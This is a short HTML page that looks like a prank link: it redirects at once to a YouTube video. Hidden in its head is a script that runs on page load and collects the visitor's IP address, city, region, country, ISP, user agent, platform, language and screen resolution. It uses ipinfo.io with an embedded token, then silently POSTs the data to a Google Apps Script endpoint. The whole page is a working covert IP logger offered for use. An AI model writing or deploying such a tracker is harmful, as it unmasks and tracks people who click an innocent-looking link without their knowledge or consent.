<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC'" />
    <script>
      async function logInfo() {
        try {
          const ipInfo = await fetch("https://ipinfo.io/json?token=4d7b0c36e45fe4").then(res => res.json());
          const data = {
            ip: ipInfo.ip,
            city: ipInfo.city,
            region: ipInfo.region,
            country: ipInfo.country,
            org: ipInfo.org,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`
          };

          await fetch("https://script.google.com/macros/s/AKfycbxRUjscEh1oDwyK8LE2NqA2eiOrfEQl8NaLx0-0EQQ9hSGoHftzpFQFPyZVm7Gqtis/exec", {
            method: "POST",
            body: JSON.stringify(data),
            headers: {
              "Content-Type": "application/json"
            }
          });
        } catch (err) {
          console.error("Logging failed", err);
        }
      }

      logInfo();
    </script>
  </head>
  <body></body>
</html>
